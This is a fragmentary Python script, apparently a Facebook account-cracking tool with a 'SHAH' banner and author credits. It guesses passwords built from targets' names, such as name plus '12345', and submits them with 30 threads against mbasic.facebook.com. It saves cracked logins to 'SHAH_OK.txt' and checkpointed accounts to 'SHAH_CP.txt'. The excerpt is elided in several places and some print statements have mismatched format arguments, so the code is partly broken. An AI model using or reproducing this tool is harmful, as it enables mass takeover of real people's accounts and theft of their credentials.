#!/usr/bin/python3 
 ...
 from concurrent.futures import ThreadPoolExecutor as SHAHbaba 
 ...
 \033[1;37m   _____ _    _          _    _  
 \033[1;37m  / ____| |  | |   /\   | |  | | 
 \033[1;37m | (___ | |__| |  /  \  | |__| | 
  \033[1;37m \___ \|  __  | / /\ \ |  __  | 
  \033[1;37m ____) | |  | |/ ____ \| |  | | 
 \033[1;37m |_____/|_|  |_/_/    \_\_|  |_| 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
 \x1b[1;97m------------------------\x1b[1;97m------------------------ 
 \033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37Murtajiz-Shah 
 \033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37Murtajiz-SHAH 
 \033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37Murtajiz-Shah 
 ...
             pass 
         if len(cp) != 0: 
             print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mShah_OK.txt' % (H, P, str(len(ok)))) 
             print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mShah_CP.txt' % (H, P, str(len(cp)))) 
             input("\x1b[1;97mPress enter to back SHAH Menu ") 
             SHAH() 
 ...
         global ok,cp,loop 
         sys.stdout.write(f"\r \x1b[1;97m[SHAH] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ") 
         sys.stdout.flush() 
         try: 
             for pw in __chi__: 
                 pw = pw.lower() 
 ...
                     print(f"\r{H} [SHAH-OK] {user} | {pw}") 
                     wrt = '%s|%s' % (user,pw) 
                     ok.append(wrt) 
                     open('SHAH_OK.txt' , 'a').write('%s\n' % wrt) 
 ...
                         print('\r%s [SHAH-CP] %s | %s ' % (M, user, pw)) 
                         wrt = '%s|%s' % (user,pw) 
                         cp.append(wrt) 
                         open('SHAH_CP.txt' , 'a').write('%s\n' % wrt) 
                         break 
 ...
             print(47*"-") 
             with SHAHbaba(max_workers=30) as babaworld: 
 ...
                             pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"] 
                             pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"] 
                         babaworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com") 
                     except: 
                         pass 
             hasil(ok,cp) 
         elif chi in ('2', '02'): 
